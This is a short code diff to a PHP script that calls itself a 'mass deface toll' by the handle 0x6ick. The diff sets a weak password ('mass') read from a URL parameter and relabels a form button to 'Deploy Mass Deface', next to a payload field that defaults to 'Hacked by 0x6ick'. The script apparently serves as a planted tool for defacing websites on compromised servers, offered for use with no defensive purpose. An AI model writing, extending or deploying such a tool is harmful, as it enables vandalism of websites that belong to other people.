@@ -3,7 +3,7 @@
 /**
             * mass deface toll by 0x6ick ( Copyright 2025 by 6ickwhispers@gmail.com
           **/
-$auth_key = "mySecretKey"; //?auth=massSecretKey
+$auth_key = "mass"; //?auth=mass
 
 if (!isset($_GET['auth']) || $_GET['auth'] !== $auth_key) {
     http_response_code(403);
@@ -166,7 +166,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <label>🧾 Payload Content:</label>
         <textarea name="c" required><?= htmlspecialchars($_POST['c'] ?? 'Hacked by 0x6ick') ?></textarea>
 
-        <input type="submit" value="🚀 Deploy Recursively">
+        <input type="submit" value="🚀 Deploy Mass Deface">
     </form>
 
     <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
